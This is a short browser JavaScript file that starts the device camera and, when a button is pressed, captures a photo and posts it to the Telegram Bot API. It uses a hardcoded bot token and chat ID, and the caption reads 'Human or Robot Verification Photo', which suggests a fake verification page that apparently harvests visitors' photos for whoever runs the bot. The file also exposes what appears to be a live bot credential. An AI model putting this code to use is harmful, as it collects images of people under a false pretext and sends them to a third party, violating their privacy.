// Telegram Bot Details
const botToken = "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc"; // Replace with your bot's token
const chatId = "7945358964"; // Replace with your chat ID

// Select elements
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureButton = document.getElementById("capture");
const ctx = canvas.getContext("2d");

// Request camera access
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" } // Use "user" for front camera
    });
    video.srcObject = stream;
  } catch (error) {
    alert("Camera access denied or unavailable.");
    console.error(error);
  }
}

// Capture photo and send to Telegram
async function captureAndSend() {
  // Draw video frame to canvas
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert canvas to Base64 image
  const imageBase64 = canvas.toDataURL("image/jpeg");

  // Prepare data for Telegram
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", dataURItoBlob(imageBase64));
  formData.append("caption", "Human or Robot Verification Photo");

  // Send image to Telegram
  try {
    await fetch(telegramUrl, {
      method: "POST",
      body: formData
    });
    alert("Photo sent to Telegram!");
  } catch (error) {
    alert("Failed to send photo.");
    console.error(error);
  }
}

// Convert Base64 to Blob
function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(",")[1]);
  const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

// Event listeners
captureButton.addEventListener("click", captureAndSend);
startCamera();
